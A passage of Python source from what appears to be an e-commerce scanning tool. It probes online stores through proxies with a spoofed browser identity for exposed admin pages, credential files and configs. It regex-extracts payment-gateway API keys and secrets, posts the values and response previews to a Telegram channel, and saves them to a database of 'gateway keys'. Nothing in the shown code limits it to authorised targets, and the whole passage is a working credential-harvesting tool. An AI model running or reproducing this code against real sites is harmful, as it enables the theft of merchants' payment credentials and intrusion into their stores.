        findings: List[EcomFinding] = []
        base = f"{urlparse(base_url).scheme}://{domain}"
        probes_run = 0

        proxy_url = None
        if self.proxy_manager:
            proxy_info = await self.proxy_manager.get_proxy(domain=domain)
            if proxy_info:
                proxy_url = proxy_info.url

        for probe in probes:
            if probes_run >= self._max_probes:
                break

            probe_url = urljoin(base, probe.path)
            probes_run += 1

            try:
                timeout = aiohttp.ClientTimeout(total=self._probe_timeout)
                kwargs = {
                    "headers": {
                        "User-Agent": (
                            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                            "AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
                        ),
                    },
                    "allow_redirects": True,
                    "max_redirects": 3,
                    "ssl": False,
                    "timeout": timeout,
                }
                if proxy_url:
                    kwargs["proxy"] = proxy_url

                if probe.method == "HEAD":
                    async with session.head(probe_url, **kwargs) as resp:
                        # For HEAD, check status + any success pattern against headers
                        if resp.status == 200:
                            # For HEAD requests on admin/login pages — 200 = accessible
                            finding = EcomFinding(
                                url=probe_url, domain=domain,
                                platform=platform, category=probe.category,
                                severity=probe.severity,
                                title=probe.description,
                                description=f"{probe.method} {probe.path} → {resp.status}",
                                data={"status": resp.status, "path": probe.path},
                            )
                            findings.append(finding)
                else:
                    async with session.get(probe_url, **kwargs) as resp:
                        if resp.status in (403, 404, 500, 502, 503):
                            continue

                        body = ""
                        try:
                            body = await resp.text(errors="replace")
                            if len(body) > 100_000:
                                body = body[:100_000]
                        except Exception:
                            pass

                        if not body:
                            continue

                        # Check if response matches success pattern
                        if probe.success_pattern:
                            success_re = re.compile(probe.success_pattern, re.IGNORECASE | re.DOTALL)
                            if not success_re.search(body):
                                continue

                        # Extract specific data if pattern provided
                        extracted = ""
                        if probe.extract_pattern:
                            ext_match = re.search(probe.extract_pattern, body, re.IGNORECASE)
                            if ext_match:
                                extracted = ext_match.group(1) if ext_match.lastindex else ext_match.group(0)

                        finding = EcomFinding(
                            url=probe_url, domain=domain,
                            platform=platform, category=probe.category,
                            severity=probe.severity,
                            title=probe.description,
                            description=f"GET {probe.path} → {resp.status}",
                            data={
                                "status": resp.status,
                                "path": probe.path,
                                "extracted": extracted,
                                "body_preview": body[:500] if probe.category == "credential" else "",
                            },
                        )
                        findings.append(finding)

                        # Also scan the probe response body for secrets
                        if body:
                            secret_finds = self._scan_for_secrets(probe_url, domain, body)
                            findings.extend(secret_finds)

            except (asyncio.TimeoutError, aiohttp.ClientError):
                continue
            except Exception as e:
                logger.debug(f"Probe failed {probe_url}: {e}")
                continue

            # Brief delay between probes to avoid triggering rate limits
            await asyncio.sleep(0.3)

        return findings

    # ════════════════════ GATEWAY PLUGIN DETECTION ════════════════════

    def _detect_gateway_plugins(
        self, url: str, domain: str, platform: str, html: str,
    ) -> List[EcomFinding]:
        """Detect payment gateway plugins from HTML/JS content."""
        findings: List[EcomFinding] = []
        plugin_patterns = PLATFORM_GATEWAY_PLUGINS.get(platform, [])

        html_lower = html.lower()
        for pattern_str, gateway, description in plugin_patterns:
            pattern = re.compile(pattern_str, re.IGNORECASE)
            if pattern.search(html_lower):
                dedup_key = f"{domain}:gateway:{gateway}"
                if dedup_key in self._reported:
                    continue
                self._reported.add(dedup_key)

                finding = EcomFinding(
                    url=url, domain=domain,
                    platform=platform, category="gateway",
                    severity="medium",
                    title=f"Payment Gateway: {description}",
                    description=f"Detected {gateway} plugin on {platform} store",
                    data={"gateway": gateway, "platform": platform},
                )
                findings.append(finding)

        return findings

    # ════════════════════ SECRET SCANNING ════════════════════

    def _scan_for_secrets(
        self, url: str, domain: str, content: str,
    ) -> List[EcomFinding]:
        """Scan content for exposed e-commerce secrets/API keys."""
        findings: List[EcomFinding] = []

        for compiled, platform, name, severity in _COMPILED_SECRETS:
            match = compiled.search(content)
            if match:
                # Extract the actual secret value (first capture group or full match)
                value = match.group(1) if match.lastindex else match.group(0)

                # Skip short or common false positives
                if len(value) < 8:
                    continue

                dedup_key = f"{domain}:secret:{name}:{value[:20]}"
                if dedup_key in self._reported:
                    continue
                self._reported.add(dedup_key)

                finding = EcomFinding(
                    url=url, domain=domain,
                    platform=platform, category="secret",
                    severity=severity,
                    title=name,
                    description=f"Exposed {name} on {domain}",
                    data={
                        "secret_type": name,
                        "value": value[:100],  # Truncate for safety
                        "platform": platform,
                    },
                )
                findings.append(finding)

        return findings

    # ════════════════════ REPORTING ════════════════════

    async def _report_findings(self, result: EcomResult):
        """Report all findings to Telegram and persist to DB."""
        if not result.total_findings:
            return

        # Report platform detection
        primary = result.primary_platform
        if primary:
            await self._rate_limit()
            await self._report_platform_detection(result)

        # Report high-severity findings individually
        for finding in result.findings:
            if finding.severity == "high":
                await self._rate_limit()
                await self._report_finding(finding)

        # Report credentials/config findings individually
        for finding in result.findings:
            if finding.category in ("credential", "config") and finding.severity != "high":
                await self._rate_limit()
                await self._report_finding(finding)

        # Report gateway plugins as batch
        if result.gateway_plugins:
            await self._rate_limit()
            await self._report_gateway_batch(result)

        # Report secrets individually (high value)
        for finding in result.secrets_found:
            await self._rate_limit()
            await self._report_secret_finding(finding)

        # Persist all to DB
        self._persist_findings(result)

    async def _report_platform_detection(self, result: EcomResult):
        """Report that an e-commerce platform was detected."""
        if not self.reporter:
            return
        try:
            import html as html_mod
            primary = result.primary_platform
            platforms_text = ", ".join(
                f"{p.name.upper()} ({p.confidence:.0%})" for p in result.platforms
            )
            text = (
                f"🛍️ <b>E-COMMERCE PLATFORM DETECTED</b> 🛍️\n"
                f"\n"
                f"<b>Platform:</b> {html_mod.escape(primary.name.upper())}\n"
                f"<b>Confidence:</b> {primary.confidence:.0%}\n"
                f"<b>Domain:</b> <code>{html_mod.escape(result.domain)}</code>\n"
                f"<b>All detected:</b> {html_mod.escape(platforms_text)}\n"
                f"<b>Fingerprints:</b> {', '.join(primary.fingerprints[:5])}\n"
                f"<b>Findings:</b> {result.total_findings} total "
                f"({sum(1 for f in result.findings + result.secrets_found if f.severity == 'high')} high)\n"
                f"<b>URL:</b> <code>{html_mod.escape(result.url[:120])}</code>\n"
                f"\n#{primary.name} #ecommerce #platform"
            )
            await self.reporter._send_message(text)
        except Exception as e:
            logger.debug(f"Platform detection report failed: {e}")

    async def _report_finding(self, finding: EcomFinding):
        """Report a single probe finding to Telegram."""
        if not self.reporter:
            return
        try:
            import html as html_mod
            severity_icon = {"high": "🔥", "medium": "⚠️", "low": "📌"}.get(finding.severity, "📌")
            category_icon = {
                "credential": "🔑", "config": "⚙️", "admin": "🔓",
                "api": "📡", "info": "ℹ️", "checkout": "🛒",
            }.get(finding.category, "📋")

            text = (
                f"{severity_icon}{category_icon} <b>E-COM FINDING</b>\n"
                f"\n"
                f"<b>Platform:</b> {html_mod.escape(finding.platform.upper())}\n"
                f"<b>Category:</b> {html_mod.escape(finding.category.upper())}\n"
                f"<b>Finding:</b> {html_mod.escape(finding.title)}\n"
                f"<b>Detail:</b> {html_mod.escape(finding.description)}\n"
                f"<b>Domain:</b> <code>{html_mod.escape(finding.domain)}</code>\n"
                f"<b>URL:</b> <code>{html_mod.escape(finding.url[:150])}</code>\n"
            )
            if finding.data.get("extracted"):
                text += f"<b>Extracted:</b> <code>{html_mod.escape(str(finding.data['extracted'])[:120])}</code>\n"
            if finding.data.get("body_preview"):
                preview = finding.data["body_preview"][:200].replace("<", "&lt;")
                text += f"<b>Preview:</b>\n<pre>{preview}</pre>\n"

            text += f"\n#{finding.platform} #{finding.category} #{finding.severity}"
            await self.reporter._send_message(text)
        except Exception as e:
            logger.debug(f"Finding report failed: {e}")

    async def _report_gateway_batch(self, result: EcomResult):
        """Report detected gateway plugins as a batch."""
        if not self.reporter:
            return
        try:
            import html as html_mod
            text = (
                f"🏦 <b>PAYMENT GATEWAY PLUGINS</b> 🏦\n"
                f"\n"
                f"<b>Platform:</b> {html_mod.escape(result.primary_platform.name.upper())}\n"
                f"<b>Domain:</b> <code>{html_mod.escape(result.domain)}</code>\n"
                f"<b>Gateways found:</b> {len(result.gateway_plugins)}\n"
                f"\n"
            )
            for i, gf in enumerate(result.gateway_plugins[:15], 1):
                gw = gf.data.get("gateway", "?")
                text += f"  <b>#{i}</b> {gw.upper()} — {html_mod.escape(gf.title)}\n"

            text += f"\n#{result.primary_platform.name} #gateways"
            await self.reporter._send_message(text)
        except Exception as e:
            logger.debug(f"Gateway batch report failed: {e}")

    async def _report_secret_finding(self, finding: EcomFinding):
        """Report an exposed secret/API key."""
        if not self.reporter:
            return
        try:
            import html as html_mod
            value_preview = str(finding.data.get("value", ""))
            if len(value_preview) > 40:
                value_preview = value_preview[:20] + "..." + value_preview[-10:]
            text = (
                f"🔥🔑 <b>E-COM SECRET EXPOSED</b> 🔑🔥\n"
                f"\n"
                f"<b>Type:</b> {html_mod.escape(finding.title)}\n"
                f"<b>Platform:</b> {html_mod.escape(finding.platform.upper())}\n"
                f"<b>Value:</b> <code>{html_mod.escape(value_preview)}</code>\n"
                f"<b>Domain:</b> <code>{html_mod.escape(finding.domain)}</code>\n"
                f"<b>URL:</b> <code>{html_mod.escape(finding.url[:150])}</code>\n"
                f"\n#{finding.platform} #secret #exposed #credentials"
            )
            await self.reporter._send_message(text)
        except Exception as e:
            logger.debug(f"Secret finding report failed: {e}")

    # ════════════════════ PERSISTENCE ════════════════════

    def _persist_findings(self, result: EcomResult):
        """Store findings in the database."""
        if not self.db:
            return

        for finding in result.findings + result.gateway_plugins + result.secrets_found:
            try:
                if finding.category == "secret" or finding.category == "credential":
                    value = finding.data.get("value", finding.data.get("extracted", ""))
                    if value:
                        self.db.add_gateway_key(
                            finding.url,
                            f"ecom_{finding.platform}_{finding.data.get('secret_type', finding.category)}",
                            str(value),
                            source=f"ecom_checker:{finding.platform}",
                            confidence=0.90,
                        )
                elif finding.category == "gateway":
                    gw = finding.data.get("gateway", "unknown")
                    self.db.add_gateway_key(
                        finding.url,
                        f"ecom_gateway_{gw}",
                        f"{finding.platform}:{gw}",
                        source=f"ecom_checker:{finding.platform}",
                        confidence=0.80,
                    )
            except Exception as e:
                logger.debug(f"Persist finding failed: {e}")

    # ════════════════════ UTILITY ════════════════════

    async def _rate_limit(self):
        """Rate limit Telegram messages."""
        now = time.monotonic()
        elapsed = now - self._last_report_time
        if elapsed < self._min_report_interval:
            await asyncio.sleep(self._min_report_interval - elapsed)
        self._last_report_time = time.monotonic()

    def get_stats_text(self) -> str:
        """Get formatted stats for /ecom command."""
        lines = [
            "🛍️ <b>E-Commerce Checker Stats</b> 🛍️",
            "",
            f"<b>URLs Checked:</b> {self.stats.urls_checked}",
            f"<b>Secrets Found:</b> {self.stats.secrets_found}",
            f"<b>Credentials Found:</b> {self.stats.credentials_found}",
            f"<b>Errors:</b> {self.stats.errors}",
            "",
        ]

        if self.stats.platforms_detected:
            lines.append("<b>Platforms Detected:</b>")
            for plat, count in sorted(
                self.stats.platforms_detected.items(), key=lambda x: -x[1]
            ):
                lines.append(f"  {plat.upper()}: {count}")
            lines.append("")

        if self.stats.gateways_detected:
            lines.append("<b>Payment Gateways:</b>")
            for gw, count in sorted(
                self.stats.gateways_detected.items(), key=lambda x: -x[1]
            ):
                lines.append(f"  {gw.upper()}: {count}")
            lines.append("")

        if self.stats.findings_by_category:
            lines.append("<b>Findings by Category:</b>")
            for cat, count in sorted(
                self.stats.findings_by_category.items(), key=lambda x: -x[1]
            ):
                lines.append(f"  {cat}: {count}")
            lines.append("")

        if self.stats.findings_by_severity:
            lines.append("<b>Findings by Severity:</b>")
            for sev, count in sorted(
                self.stats.findings_by_severity.items(),
                key=lambda x: {"high": 0, "medium": 1, "low": 2}.get(x[0], 3),
            ):
                icon = {"high": "🔥", "medium": "⚠️", "low": "📌"}.get(sev, "")
                lines.append(f"  {icon} {sev}: {count}")

        avg_time = (
            self.stats.total_check_time / self.stats.urls_checked
            if self.stats.urls_checked > 0 else 0
        )
        lines.append(f"\n<b>Avg check time:</b> {avg_time:.1f}s")

        return "\n".join(lines)

    def reset_dedup(self):
        """Reset dedup cache between cycles."""
        self._reported.clear()
